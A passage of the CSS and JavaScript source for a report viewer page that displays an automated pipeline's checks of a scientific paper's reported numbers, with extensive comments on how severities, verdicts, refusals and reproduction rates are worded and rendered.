  nav,#navtoggle,.copyq,.printbtn,#cq,#ct,input[type=search],select{display:none!important}
  main{margin:0;padding:0;max-width:none}
  section{display:block!important}
  /* Every section on the page, not just the open one. */
  section:not(.on){display:block!important}
  h2{break-before:page;page-break-before:always}
  section:first-of-type h2{break-before:auto;page-break-before:auto}
  .finding,.card,.asrep,details{break-inside:avoid;page-break-inside:avoid}
  details{display:block}
  details>summary{list-style:none}
  details:not([open])>*:not(summary){display:revert}
  a{color:inherit;text-decoration:none}
  pre{white-space:pre-wrap;word-break:break-word}
  .printhead{display:block!important}
  body{background:#fff;color:#000}
}
/* Off screen, on paper. Repeats on every sheet via `position:fixed` in the
   print context, which is how browsers render a running header. */
.printhead{display:none;position:fixed;top:0;left:0;right:0;font-size:9pt;
  border-bottom:1px solid #999;padding:2px 0;color:#000}
.printbtn{margin-left:8px}
/* Fused to the severity chip, and deliberately quieter than it: the grade
   qualifies the verdict, it does not compete with it. Same dashed idiom as
   `.asrep` -- in this document a dashed border means "this is about how we
   know, not about the paper". */
.evfuse{font-size:12px;color:var(--muted);border:1px dashed var(--rule);
  border-radius:10px;padding:1px 7px;margin-left:6px;white-space:nowrap;
  vertical-align:middle}
/* Same dashed idiom, and deliberately so: "a norm we supplied" is also a
   statement about how we know rather than about the paper. It sits beside the
   evidence chip because the two answer the reader's two different questions --
   who computed this, and whose standard it is being measured against. */
.warrfuse{font-size:12px;color:var(--muted);border:1px dashed var(--rule);
  border-radius:10px;padding:1px 7px;margin-left:6px;white-space:nowrap;
  vertical-align:middle;cursor:help}
.asrep{border:1px dashed var(--rule);border-radius:6px;padding:8px 12px;
  margin:10px 0;font-size:14.5px;background:transparent}
.asrep p{margin:6px 0}
.asrep-chip{font-size:12px;border:1px dashed var(--rule);border-radius:10px;
  padding:1px 7px;margin-left:6px;white-space:nowrap;vertical-align:middle}
/* THE VIGNETTE, one tool call in five labelled parts. Deliberately NOT a card
   or a panel: a left rule and a small caps heading, which is how a journal
   sets a structured abstract, and which keeps forty of them on one page
   scannable. A DIV and not a `section` -- `section{display:none}` above hides
   every section that is not the open tab, and a `<section>` here would render
   the whole page's worth of vignettes invisible while every test on the HTML
   string still passed. */
.vpart{border-left:3px solid var(--rule);padding:1px 0 1px 12px;margin:12px 0}
.vpart>h5{margin:0 0 4px;font-size:11px;letter-spacing:.09em;text-transform:uppercase;
  color:var(--muted);font-family:system-ui,-apple-system,sans-serif;font-weight:600}
.vpart p{margin:5px 0;font-size:14.5px}
.vargs{list-style:none;padding:0;margin:6px 0;
  font-family:system-ui,-apple-system,sans-serif;font-size:13.5px}
.vargs li{margin:2px 0}
.vargs code{background:var(--code);padding:1px 4px;border-radius:3px}
.vargs .r{color:var(--muted)}
/* The tool's OWN numbers, laid out to be skimmed. Passes and refusals are 75%
   of every archived call that returned a verdict, and a reader needs to see
   what the check had in hand before a pass means anything to them. */
.vnums{display:flex;flex-wrap:wrap;gap:3px 16px;margin:6px 0;
  font-family:system-ui,-apple-system,sans-serif;font-size:13px;color:var(--muted)}
.vnums b{color:var(--fg);font-weight:600}
.vlev{margin:9px 0}
.vlev>b{display:block;font-size:14px}
.vlev p{margin:2px 0;color:var(--muted);font-size:13.5px}
/* Three lines, above the verdict. Quiet enough not to be an alarm, present enough
   that a reader who stops after the verdict has still seen it. */
.beforeread{border:1px solid var(--rule);border-radius:4px;padding:8px 12px;
  margin:14px 0;font-size:13.5px;color:var(--muted);line-height:1.5}
.beforeread b{color:var(--fg)}
/* THE EVIDENCE GRADE, at the top of a card. Bordered, because the point is that
   it qualifies everything below it -- a reader who takes the finding and skips
   this has taken the half that looks strongest. */
.evgrade{border:1px solid var(--flag);border-radius:4px;padding:6px 10px;
  margin:8px 0;font-size:13.5px;line-height:1.5}
/* WHAT WOULD SETTLE THIS. Set apart, last, and quiet: it is the reader's next
   action, not another accusation. */
.settle{border-left:3px solid var(--rule);padding:6px 12px;margin:12px 0;
  font-size:13.5px;line-height:1.5}
.settle ul{margin:6px 0 0 18px;padding:0}
.settle b{color:var(--fg)}
/* The frame inside the crop. Small, muted, on every card, because cropping is
   how a question becomes an allegation. */
.cardfoot{margin-top:12px;padding-top:8px;border-top:1px solid var(--rule);
  font-size:11.5px;color:var(--muted)}
.abstract{margin-top:6px;font-size:13.5px;line-height:1.55;white-space:pre-wrap}
/* Louder than `.note`, and deliberately so. `.note` qualifies a review; this
   says the document you are reading could not open the paper it describes, so
   nothing below it means what it appears to mean. A left rule is too easy to
   read past for that. */
.alarm{border:2px solid var(--flag);border-radius:4px;background:var(--code);
  padding:10px 14px;margin:12px 0;font-size:14.5px}
.alarm b{color:var(--flag)}
/* The paper's identity, above everything. Quiet -- it is orientation, not the
   conclusion -- but unmissable, because a reader who does not know which paper
   this is cannot use anything below it. */
.ident{border-bottom:1px solid var(--rule);padding-bottom:10px;margin-bottom:16px}
.ident .ititle{font-weight:600;font-size:17px;line-height:1.35}
.ident .imeta{color:var(--muted);font-size:13px;margin-top:3px}
/* WHICH RUN, under WHICH PAPER. Deliberately quieter than the byline and set
   apart by a rule: it is provenance, not content, and it must not compete with
   the paper's own identity for the eye. */
.ident .runid{color:var(--muted);font-size:12px;margin-top:6px;
  padding-top:6px;border-top:1px solid var(--rule)}
.ident .runid+.runid{border-top:0;padding-top:2px;margin-top:2px;font-style:italic}
/* Names the SCALE a grade is on. Two grades printed side by side with no
   scale read as one grade contradicting itself. */
.scale{display:inline-block;font:11px system-ui,sans-serif;text-transform:uppercase;
  letter-spacing:.06em;color:var(--muted);margin-right:8px;vertical-align:middle}
/* Whose limit a refusal was. Colour carries the same message as the words --
   only `ours` is a shortfall of this review -- so the eye can sort the table
   without reading every reason. */
.whose{display:inline-block;font:11px system-ui,sans-serif;font-weight:600;
  padding:1px 7px;border-radius:9px;border:1px solid var(--rule);white-space:nowrap}
.whose.na{color:var(--ok);border-color:var(--ok)}
.whose.paper{color:var(--warn);border-color:var(--warn)}
.whose.inputs{color:var(--muted)}
.whose.ours{color:var(--flag);border-color:var(--flag)}
.whose.unclassified{color:var(--muted);border-style:dashed}
.copyq{font:13px system-ui,sans-serif;padding:4px 12px;margin-right:10px;
  border:1px solid var(--rule);border-radius:3px;background:var(--code);
  color:var(--fg);cursor:pointer}
.copyq:hover{border-color:var(--link);color:var(--link)}
/* OFF-SCREEN, NOT `display:none`. `execCommand('copy')` copies the SELECTION,
   and an element that is not laid out cannot hold one -- hiding this the
   obvious way would break the only copy path a `file://` page has. */
.offscreen{position:absolute;left:-9999px;width:1px;height:1px;opacity:0}
textarea#qtext:not(.offscreen){display:block;width:100%;min-height:9em;
  font:13px/1.5 system-ui,sans-serif;padding:8px;margin:8px 0;
  border:1px solid var(--flag);border-radius:3px;
  background:var(--bg);color:var(--fg)}
/* `align-items:flex-start` is inherited from #wrap and, once the container is
   a COLUMN, it sizes children to their content instead of the viewport -- so
   `main` measured 960px inside a 400px window and 9 of 12 sections scrolled
   the page sideways, which also defeated the `.scroll` wrappers that exist to
   keep wide tables inside their own box. */
@media(max-width:860px){#wrap{flex-direction:column;align-items:stretch}
  nav{width:100%;flex:none;
  height:auto;position:static;border-right:0;border-bottom:1px solid var(--rule)}
  main{padding:16px;max-width:100%}
  .split{flex-direction:column;height:auto}.split>div{height:60vh}
  /* The two remaining overflow sources at 400px, measured: the Report page's
     rendered markdown tables (850px) and the Findings page's long unbroken
     tokens -- locations, DOIs and reproduction commands inside <code> (602px).
     A table gets its own scroller; a token is allowed to break mid-word,
     because a horizontal scrollbar on the whole document is worse. */
  .report table,.finding table{display:block;overflow-x:auto;max-width:100%}
  code,.finding dd,.finding h3,td,th{overflow-wrap:anywhere;word-break:break-word}
  pre{white-space:pre-wrap;overflow-wrap:anywhere}
  /* `.kvlist .k` is `white-space:nowrap` so the two-column grid stays aligned.
     That is right at desktop width and wrong at 400px, where a key like "grim
     percentage needs a numerator the cell does not print" measured 493px and
     pushed the Findings page to 803px wide. Stack the pairs instead. */
  .kvlist{grid-template-columns:1fr}
  .kvlist .k{white-space:normal;margin-top:6px}}
</style></head><body>
<button id="navtoggle" title="show/hide contents">&#9776;</button>
<button id="theme">theme</button>
<!-- THE RUNNING HEADER, hidden on screen and repeated on every printed sheet.
     A page cropped out of the middle of this document and circulated is the
     route by which an automated flag becomes an accusation nobody qualified,
     so the disclaimer travels with the paper rather than sitting on page 1. -->
<div class="printhead" id="printhead"></div>
<div id="wrap"><nav id="nav"><b>Contents</b></nav><main id="main"></main></div>
<script type="application/json" id="payload">__DATA__</script>
<script>
const D = JSON.parse(document.getElementById('payload').textContent);
const DN_MAP = __DISPLAY_NAMES__;
const DN = k => DN_MAP[k] || k;
const esc = s => String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
/* Severity words are CODED, and the reader is not assumed to know the code:
   for many checks 'suspicious' means only a discrepancy worth asking about,
   and 'indeterminate' means the check REFUSED -- but the bare words read as
   accusations. The definitions used to exist only in the codebook, a
   different tab from every place the words appear. Each occurrence now
   carries its own definition (hover title) and jumps to the codebook on
   click (the data-cb handler at the end of this script) -- the same device
   as cropTag, which already pairs a coloured word with the title that
   explains it. The codebook severity table is built from this same map, so
   the two cannot drift apart. */
const SEV_DEF={
  impossible:'No dataset could produce the reported numbers. Arithmetic, not judgement.',
  highly_suspicious:'Very hard to explain innocently, but not arithmetically ruled out.',
  suspicious:'A discrepancy worth asking about. Reporting slips are common and are the likeliest cause -- a question, not an accusation.',
  indeterminate:'A REFUSAL. A precondition could not be verified, so the check declined to judge. Not evidence of a problem, and not evidence of its absence.',
  consistent:'The check ran and found no discrepancy.',
};
const sev = s => s ? `<span class="sev ${esc(s)}"${SEV_DEF[s]?` title="${esc(SEV_DEF[s])}" data-cb="cb-severity"`:''}>${esc(String(s).replace(/_/g,' '))}</span>` : '';

/* The verdict is the most prominent coded word in the document and it was
   once defined NOWHERE in it: the three values appeared zero times outside
   the value itself, and a reader not told that the middle one WAS the middle
   of a three-value scale read it as probably-fraudulent -- an accusation this
   system did not make. Both halves of that are fixed here: the scale is
   defined, and the words themselves were replaced on 2026-08-11 because the
   originals claimed something about the PAPER when this system knows only
   whether numbers reconcile. See `verdicts.py` for the reasoning and the
   old-to-new map. */
/* THE WORDS CHANGED ON 2026-08-11 and the page renders the current ones,
   whatever the report on disk says. `trustworthy | questionable |
   untrustworthy` made a claim about the PAPER; this system knows whether
   numbers reconcile. 34 archived reports use the old vocabulary, so the map
   from old to new is SHIPPED IN THE PAYLOAD (`facts.verdict_vocab`, built
   from `verdicts.MEANING` and `verdicts.LEGACY`) rather than duplicated here,
   and a report written in the old words is rendered in the new ones with a
   note saying so.

   The comment here used to CLAIM that already, naming a `facts.verdict` key
   that did not exist, while the definitions and the legacy map sat in JS
   literals directly below it. Two copies of a three-word vocabulary is how the
   markdown renderer ended up with no copy at all and printing the retired
   word, so the claim is now true. */
const VERDICT_DEF=((D.facts||{}).verdict_vocab||{}).defs||{};
const VERDICT_LEGACY=((D.facts||{}).verdict_vocab||{}).legacy||{};
function verdictCanonical(v){
  const raw=String(v||'').trim().toLowerCase();
  return VERDICT_DEF[raw] ? raw : (VERDICT_LEGACY[raw] || null);
}
function verdictWord(v){
  const c=verdictCanonical(v);
  /* Unrecognised is rendered AS IT CAME, never coerced into one of the three.
     A verdict the page cannot place is a corruption of the one field a reader
     acts on, and guessing at it would hide exactly that. */
  if(!c) return esc(v??'');
  const raw=String(v||'').trim().toLowerCase();
  const note = (raw!==c)
    ? ' This report was written before the wording changed; it recorded `'+raw+'`, which is the same verdict.'
    : '';
  /* No trailing '.' appended: the definitions now come from `verdicts.MEANING`,
     which are whole sentences that punctuate themselves. Appending one gave
     '..' the moment the prose stopped being a JS fragment. */
  return `<span class="def" title="${esc('One of reconciles / unresolved / does_not_reconcile -- '+VERDICT_DEF[c]+note)}" data-cb="cb-verdict">${esc(c.replace(/_/g,' '))}</span>`;
}
/* TWO FUNCTIONS RENDER THE VERDICT, and the rename only reached one of them.
   `verdictWord` was taught the legacy map; this indexed `VERDICT_DEF` directly
   with the RAW value, so an archived report saying `questionable` fell through
   to `esc(v)` and the Overview printed a bare word with no definition, no
   codebook link and no scale -- exactly the defect the codebook work existed to
   fix, reintroduced by fixing its neighbour. Both go through
   `verdictCanonical` now. */
function verdictHtml(v){
  if(!v) return '-';
  const c=verdictCanonical(v);
  if(!c) return esc(v);
  return verdictWord(v)+` <span class="muted">-- ${esc(VERDICT_DEF[c])} (one verdict of three; click the word for the codebook)</span>`;
}

/* Consequence: what a finding CHANGES, as opposed to how wrong it is. Ordering
   within a severity band, mirroring consequence.rank() on the Python side --
   flips a decision, then affects stated claims, then unknown, then explicitly
   flips nothing. Unknown outranks "flips nothing" deliberately: "we did not
   determine this" must never be displayed above something we checked and
   cleared. */
function cRank(f){
  const c = f && f.consequence; if(!c) return 21;
  const claims = c.claims_affected||0;
  const level = c.flips_significance===true ? 0
    : claims>0 ? 10 : (c.flips_significance===false ? 30 : 20);
  return level + (c.basis==='computed' ? 0 : 1);
}
/* Where the tool and the review disagreed about how serious something is.
   Shown always, not only when unexplained: a reader deciding how much to trust
   a downgrade needs to know one happened. */
function sSrc(f){
  const s = f && f.severity_source; if(!s) return '';
  const cls = s.explained ? 'conseq' : 'conseq unexplained';
  return `<p class="${cls}"><b>Severity ${esc(s.direction||'changed')}:</b> `
    + `tool computed <code>${esc(s.tool)}</code>, review recorded `
    + `<code>${esc(s.model)}</code>. ` + esc(s.note||'') + `</p>`;
}
function cHtml(f){
  const c = f && f.consequence; if(!c) return '';
  const bits=[];
  if(c.flips_significance===true) bits.push('changes a significance decision');
  else if(c.flips_significance===false) bits.push('changes no significance decision');
  if(typeof c.claims_affected==='number' && c.claims_affected>0)
    bits.push(c.claims_affected+' stated claim'+(c.claims_affected===1?'':'s')+' affected');
  if(!bits.length) return '';
  const computed = c.basis==='computed';
  const tag = computed ? 'computed' : 'asserted, not computed';
  const why = c.explanation ? ' &mdash; '+esc(c.explanation) : '';
  return `<p class="conseq ${computed?'computed':''}"><b>Consequence:</b> `
    + esc(bits.join('; ')) + why + ` <span class="muted">(${tag})</span></p>`;
}

/* Render any value honestly. A dict used to reach innerHTML as "[object
   Object]", which threw away the most useful content in the whole finding. */
function val(v, depth){
  depth = depth||0;
  if(v===null||v===undefined||v==='') return '<span class="muted">not given</span>';
  if(Array.isArray(v)){
    if(!v.length) return '<span class="muted">none</span>';
    return '<ul style="margin:2px 0 2px 18px;padding:0">'+
      v.map(x=>`<li>${val(x,depth+1)}</li>`).join('')+'</ul>';
  }
  if(typeof v==='object'){
    // Aligned rows, NOT a bordered table. Nested <table> inside a definition
    // list made several independent tables read as one broken one, with cell
    // edges landing at different positions down the page.
    return '<div class="kvlist">'+Object.entries(v).map(([k,x])=>
      `<div class="k">${esc(k.replace(/_/g,' '))}</div><div class="v">${val(x,depth+1)}</div>`
    ).join('')+'</div>';
  }
  if(typeof v==='number') return `<span class="mono">${esc(v)}</span>`;
  return esc(v);
}

/* Sortable + filterable table. Applied to every table in the document. */
let TID=0;
/* WHAT EACH SECTION'S DENOMINATOR IS, or plainly why there is none.
   MEASURED across the archive: 223 banner sections, ZERO with a derived
   denominator, and `composite._derive_n` gives its reason on 217 of them --
   "no column yielded a verified denominator". That is the right answer for
   those tables (animal experiments carrying mean (SD), so there is no count
   column to sum against a printed percentage), and it is worth saying, because
   a section with no denominator and a section nobody tried to find one for
   look identical when both render as blank. */
/* WHAT THE PARSE MADE OF THIS TABLE, in one line under the grid.
   Greg, 2026-08-12: showing the original beside the processed version "would
   reveal any gross parsing errors". The per-cell overlay does that for a cell;
   this does it for the TABLE, because a systematic failure is a shape repeated
   many times and the count is what makes it visible. "36 cells share the unread
   shape `<9.9`" is one sentence a reader acts on; 36 struck-out cells scattered
   through a grid is not. */
function processedNote(t){
  const p=t.processed||{};
  if(!p.n) return '';
  const cov=(p.coverage===null||p.coverage===undefined)?null:Math.round(p.coverage*100);
  const kinds=Object.keys(p.kind_counts||{})
    .sort((a,b)=>p.kind_counts[b]-p.kind_counts[a])
    .map(k=>p.kind_counts[k]+' '+k).join(', ');
  const clusters=(p.unparsed||[]).filter(c=>c.numeric_shaped&&c.n>=3);
  const warn=clusters.length
    ? `<div class="parsewarn"><b>${clusters[0].n} cell(s) share the unread format
        <code>${esc(clusters[0].shape)}</code></b> (e.g. ${esc(String(
        (clusters[0].examples||[])[0]||''))}). Cells that all fail the same way are
        an unhandled convention in OUR parser, not an empty table.${
        (clusters[0].candidate_formats||[]).length
          ? ' Readable as: '+esc(clusters[0].candidate_formats.slice(0,3).join(', '))+'.'
          : ' No format in the vocabulary parses them.'}</div>`
    : '';
  return `<div class="pnote muted">Parsed ${p.n} cell(s)${
    cov===null?'':', '+cov+'% understood'}${kinds?' &middot; '+esc(kinds):''}${
    p.n_unplaced?' &middot; '+p.n_unplaced+' not positioned':''}</div>`+warn;
}

function toggleProcessed(a){
  const fig=a.closest('figure');
  if(!fig) return;
  const on=fig.classList.toggle('showproc');
  a.textContent=(on?'original ':'parsed ')+'⇄';
}

function sectionNote(t){
  const s=((t.sections||[])[0]||{}).sections||[];
  if(!s.length) return '';
  const got=s.filter(x=>x.n);
  return `<details class="secnote"><summary class="muted">${s.length} section${
    s.length===1?'':'s'} in this table &middot; ${got.length
      ? got.length+' with a reconstructed denominator'
      : 'none has a denominator we could verify'}</summary>
    ${tbl(['section','denominator','how / why not'], s.map(x=>[
      esc(x.label||''),
      x.n?`<b>${esc(String(x.n))}</b>`:'<span class="muted">-</span>',
      esc(x.n?String(x.n_source||'reconstructed')
            :String(x.why_not||'not attempted'))]))}
    <p class="muted">A reconstructed denominator is NOT printed in the paper. It
      is accepted only when it reproduces every percentage its section prints,
      and any check that used one is capped accordingly.</p></details>`;
}

function tbl(head, rows, opts){
  opts=opts||{};
  if(!rows.length) return '<p class="muted">Nothing recorded.</p>';
  const id='t'+(++TID);
  const filter = rows.length>=(opts.filterFrom||8)
    ? `<div style="margin:6px 0"><input type="search" data-for="${id}" placeholder="filter ${rows.length} rows..." size="34"></div>` : '';
  return filter+`<div class="scroll"><table id="${id}" data-sortable="1"><thead><tr>`+
    head.map((h,i)=>`<th data-col="${i}">${esc(h)}</th>`).join('')+
    `</tr></thead><tbody>`+
    rows.map(r=>`<tr>${r.map(c=>`<td>${c}</td>`).join('')}</tr>`).join('')+
    `</tbody></table></div>`;
}
/* A key/value block. `tbl` insists on a header row, which for a two-column
   name/value list reads as a blank cell above the names and the word "value"
   above the values -- one row of pure noise at the top of every such table.
   These are also not sortable or filterable: there is nothing to sort a fixed
   schema into. */
function kv(rows){
  if(!rows.length) return '<p class="muted">Nothing recorded.</p>';
  return `<div class="scroll"><table class="kv"><tbody>`+
    rows.map(r=>`<tr><th scope="row">${r[0]}</th><td>${r[1]}</td></tr>`).join('')+
    `</tbody></table></div>`;
}
/* The one banner that outranks the review. If the bundle could not open the
   paper, every pane below is empty for a reason that has nothing to do with
   the paper -- and an empty pane is indistinguishable from a clean one. Shown
   on the landing page and again beside the panes it explains, because a reader
   who deep-links to Source and extraction never passes the Overview. */
/* A table's footnotes, shown WITH the table. `180.74**` is not a number until
   you know what `**` means, and the note that says so is printed at the foot of
   the table in the paper for exactly that reason. Not collapsed: a reader who
   has to click to learn that an asterisk means p < 0.001 will read the cell
   wrong first. */
function fnotes(t){
  const fs=(t.footnotes||[]).filter(f=>(f.text||'').trim());
  if(!fs.length) return '';
  return `<div class="tfoot">${fs.map(f=>
    `<span>${f.marker?`<b>${esc(f.marker)}</b> `:''}${esc(f.text)}</span>`
  ).join('')}</div>`;
}
/* A severity histogram as one cell, always in ladder order so two columns of
   them can be compared down the page rather than read one at a time. */
function sevList(counts){
  const c=counts||{};
  const parts=SEVERITY_ORDER.filter(s=>c[s]).map(s=>sev(s)+' '+c[s]);
  return parts.join(', ')||'<span class="muted">-</span>';
}
/* WHICH PAPER THIS IS, at the top of the landing page.
   Deliberately NOT the metadata table: that carries the abstract, and the
   abstract at the top is what buried the verdict a screen and a half down in
   the first place. Title, byline, and the DOI as a link -- enough to know what
   you are reading and to go and read the original, nothing more. Everything
   else stays in the table below. */
function identityHead(){
  const g=f=>((D.paper_facts||[]).find(x=>x.fact===f)||{}).value||'';
  const missing=v=>!v||v==='not recorded'||v==='not mentioned in paper';
  const title=D.paper_title||g('Title');
  const authors=g('Authors'), year=g('Year'), doi=g('DOI'), journal=g('Publication');
  // Long author lists are a byline, not a dataset; the full list is in the
  // table below. Truncation is by PEOPLE, not characters, so it never cuts a
  // name in half.
  const people=missing(authors)?[]:authors.split(',').map(s=>s.trim()).filter(Boolean);
  const byline=people.length>4
    ? people.slice(0,3).join(', ')+' and '+(people.length-3)+' others'
    : people.join(', ');
  const bits=[byline, missing(journal)?'':journal, missing(year)?'':year]
    .filter(Boolean).map(esc);
  /* WHICH RUN IS THIS. Greg's constraint was that the reader must know what
     report they are reading on the landing page, and only half of it was met:
     the PAPER was identified at the top while WHO PRODUCED THIS, WHEN and WITH
     WHAT lived seven screens down under "How this review was produced". A
     bundle that arrives by email needs both above the fold.

     Built from `run_facts`, which already computes every field -- this is a
     placement fix, not a new computation, so the strip and the table further
     down cannot disagree. */
  const rf=(D.run_facts||[]);
  const rv=f=>((rf.find(x=>x.fact===f)||{}).value||'');
  const runbits=['Analysed','Pipeline version','Mode','Model','Reasoning effort','Wall time']
    .map(rv).filter(v=>v&&v!=='not recorded'&&v!=='version not recorded').map(esc);

  return `<div class="ident">
    <div class="ititle">${esc(title||D.paper_id||'Untitled')}</div>
    ${bits.length?`<div class="imeta">${bits.join(' &middot; ')}</div>`:''}
    ${missing(doi)?'':`<div class="imeta"><a href="https://doi.org/${
      encodeURI(doi)}">${esc(doi)}</a></div>`}
    ${runbits.length?`<div class="runid">${runbits.join(' &middot; ')}</div>`:''}
    ${/* THE STANDING STOCHASTICITY SENTENCE. The viewer presents one run as
          THE review, and the pipeline is not deterministic. MEASURED on the
          funder demo: `control_blinded` and `control_blinded_r2` are two runs
          of the SAME paper on the same day and returned 8 findings and 10, with
          the same verdict and the same confidence.

          This is the single most decision-relevant fact a sceptical reader can
          be given about how much weight one finding carries, the data proving
          it was already on disk, and the document was silent on it. One
          sentence, always shown, no per-run computation to get wrong. */''}
    <div class="runid muted">A re-run of this pipeline on the same paper
      produces an overlapping, not identical, set of findings.</div>
  </div>`;
}
/* WHOSE LIMIT WAS IT.
   Greg, 2026-08-10: "the naive reading is that our tool failed, when in fact it
   means something more flattering like supplemental materials weren't available
   or insufficient info was reported."

   Classified on the run's own 12 refusals for
   10.1038/s41537-025-00576-3, by hand, before writing this: 2 not-applicable,
   5 the-paper-does-not-report-it, 2 material-not-supplied, 2 our-tooling, 1
   mixed. So the reading "our tool failed 12 times" is wrong on 10 of them.

   THIS IS A HEURISTIC OVER PROSE, and it is ordered so the least flattering
   reading wins ties: `ours` is tested FIRST, so a refusal that mentions both
   our limit and the paper's is filed under ours. A classifier that resolved
   ambiguity in our own favour would be worse than no classifier. Anything it
   cannot place stays `unclassified` rather than being guessed into a
   comfortable bucket. */
/* THE TABLE IS SHIPPED, NOT RESTATED. `D.facts.refusal_kinds` carries the
   Python `REFUSAL_KINDS` verbatim, so the bucket a reason lands in on this page
   is the bucket the test suite pins. The literal below is the FALLBACK for a
   bundle built before that field existed -- and it is exactly why the field
   exists: the two copies had already drifted, the JS `na` tier being six
   alternations behind Python's, so a reason could be classified one way by a
   test and another way by the page the test was supposed to cover. */
const REFUSAL_KINDS=(((D.facts||{}).refusal_kinds)||[]).length
  ? D.facts.refusal_kinds.map(k=>({key:k.key,label:k.label,re:new RegExp(k.re,'i')}))
  : [
  /* TIER 1: AN EXPLICIT DECLARATION BEATS EVERY KEYWORD.
     Caught in testing: "detect_duplication across tables -- Not applicable. The
     paper reports no means with standard deviations anywhere..." was filed under
     "the paper does not report it", because the `paper` keywords matched before
     `na` was ever tested. That is the worst direction this can fail in: it turns
     a check that simply does not apply into an implied deficiency of the
     publication, which is precisely the accusation-by-accounting Greg asked to
     be guarded against. When the reason says outright that it does not apply,
     nothing downstream gets a vote. */
  {key:'na', label:'does not apply here',
   re:/\bnot applicable\b|\bdeliberately not run\b/i},
  {key:'ours', label:'our tooling',
   re:/no batch form|not run by (this|the) review|returned n_tests = 0|our (tool|extraction|harness)|exceeded the harness|no ocr|tool (does not|doesn't) (exist|support)|not computed by any available tool|no tool (exists|available)/i},
  {key:'inputs', label:'not supplied to us',
   re:/not (present|supplied|delivered|in the package)|could not be read|not deliverable|supplement(ary)? .*(not|un)(available|readable|supplied)|embedded as an image/i},
  {key:'paper', label:'the paper does not report it',
   re:/prints no|reports no|no (standard deviation|test statistic|exact p|degrees of freedom|dispersion|p-value)|nothing to recompute|appear(s)? nowhere|not (printed|reported) (numerically|in the (main )?text)|only as bars|no numeric/i},
  {key:'na', label:'does not apply here',
   re:/not applicable|deliberately not run|would be meaningless|carries none of the meaning|no \(mean, sd\) pairs|there are no /i},
];
function classifyRefusal(reason){
  const s=String(reason||'');
  for(const k of REFUSAL_KINDS) if(k.re.test(s)) return k;
  return {key:'unclassified', label:'not classified'};
}
/* The counts, before the table, because the counts are the point. */
function refusalTally(rows){
  const n={};
  (rows||[]).forEach(r=>{const k=classifyRefusal(r.reason); n[k.key]=(n[k.key]||0)+1;});
  const order=[
    ['na','does not apply to this paper&#39;s design','Not a shortfall. The check has no meaning here, and declining to run it is the correct answer.'],
    ['paper','the paper does not report what the check needs','A property of the publication. Where the paper CLAIMS to have used something it never prints, that is also a question worth putting to the authors.'],
    ['inputs','the material was not supplied to this review','About our inputs, not about the paper and not about our checks.'],
    ['ours','this toolkit could not do it','The only bucket that is our shortfall.'],
    ['unclassified','not classified','The reason did not match any rule. Read it below rather than trusting a count.'],
  ].filter(([k])=>n[k]);
  if(!order.length) return '';
  return `<div class="scroll"><table class="kv"><tbody>${order.map(([k,label,why])=>
    `<tr><th scope="row"><span class="whose ${k}">${n[k]}</span> ${label}</th>
     <td class="muted">${why}</td></tr>`).join('')}</tbody></table></div>`;
}
/* The reproduction counts, sorted by cause and with the rate stated over the
   right denominator.

   BACK-COMPATIBLE BY ARITHMETIC, not by re-running. Bundles built before the
   split carry only `n_valid`/`n_invalid`, so the new fields are derived where
   they can be and the row is omitted where they cannot -- an absent row is
   honest, an invented zero is not. */
function reproTally(rep){
  const r=rep||{};
  /* THE DENOMINATOR IS EVERY OBJECT THAT CARRIES A COMMAND, headline included.
     `n_findings` used to mean that and be named otherwise, so this row read
     "findings in this run: 25" in a report holding 24. `n_targets` is the
     honest name; `n_findings` is the fallback for bundles built before the
     split, where it still carries the old combined meaning. */
  const findings=(typeof r.n_targets==='number') ? r.n_targets : (+r.n_findings||0);
  const head=(typeof r.n_headline==='number') ? r.n_headline : null;
  const none=(typeof r.n_no_command_applies==='number') ? r.n_no_command_applies : null;
  const expected=(typeof r.n_command_expected==='number') ? r.n_command_expected
                 : (none===null?null:findings-none);
  /* `ok` WAS THE ONE FIELD THIS FUNCTION DID NOT GUARD, and its own comment
     above says "an absent row is honest, an invented zero is not". Written
     `+r.n_ran_ok||0`, an ABSENT count -- which is every run that did not pass
     --execute, i.e. nearly all of them -- became a hard zero, and the rate line
     below then printed "0 of 35 findings can be re-run (0%). The shortfall is a
     defect in how we WRITE commands" on a run where no command was ever
     executed and all 34 passed the static check. A false statement about our
     own work, in published output, reachable at HEAD. Absent now means UNKNOWN,
     and no rate is computed from it. */
  const ok=(typeof r.n_ran_ok==='number') ? r.n_ran_ok : null;
  const unparse=(typeof r.n_unparseable==='number') ? r.n_unparseable : null;
  const failed=+r.n_ran_failed||0;
  const rows=[];
  /* TWO COLUMNS, TWO ELEMENTS. Every row used to be a THREE-element array
     whose middle slot was a count -- and the renderer below reads `x[0]` and
     `x[2]` only, so `String(findings)` was computed, passed, and displayed
     nowhere on any run ever built. Every other row had already worked around
     it by embedding its number in the label and passing '' in the middle. The
     slot is gone so nothing can be dropped into it again. */
  let label=`<b>${findings}</b> findings in this run`;
  let note='';
  if(head!==null){
    label=`<b>${findings}</b> objects carry a command`;
    note = head
      ? `The ${findings-head} findings, plus the headline -- which carries the `
        +`single most prominent command in the report and is checked like the rest.`
      : 'Findings only; this report has no headline command.';
  }
  rows.push([label, note]);
  if(none!==null) rows.push([`<span class="whose na">${none}</span> are a reading of the paper`,
    'Nothing reproduces a judgement. Not a failure, and not counted as one.']);
  if(expected!==null) rows.push([`<b>${expected}</b> should carry a command`,
    'The only findings the rate below is about.']);
  if(ok!==null) rows.push([`<span class="whose na">${ok}</span> ran and reproduced`, '']);
  if(unparse!==null && unparse) rows.push([`<span class="whose ours">${unparse}</span> never ran`,
    'The string did not parse as a command, so nothing was executed. Our defect.']);
  if(failed) rows.push([`<span class="whose ours">${failed}</span> ran and exited non-zero`,
    'Almost always the wrong argument SHAPE, not wrong arithmetic. Our defect.']);
  const rate=(ok===null)
    ? `<p class="muted">No reproduction command was executed on this run, so
        there is no re-run rate to report. The commands were checked for SHAPE
        only -- whether they parse as something this toolkit could run -- not
        run. That is a limit of this run, not a finding about the commands.</p>`
    : (expected&&expected>0)
    ? `<p><b>${ok} of ${expected}</b> findings that should carry a command can be
        re-run from the string we printed (${Math.round(100*ok/expected)}%).
        ${expected>ok?`The shortfall is a defect in how we WRITE commands, and
        says nothing about whether those findings are right.`:''}</p>`
    : '';
  return rate+`<div class="scroll"><table class="kv"><tbody>${rows.map(x=>
    `<tr><th scope="row">${x[0]}</th><td class="muted">${x[1]}</td></tr>`
  ).join('')}</tbody></table></div>`;
}
function unreachable(){
  const m=(D.table_extraction||{}).paper_unreachable;
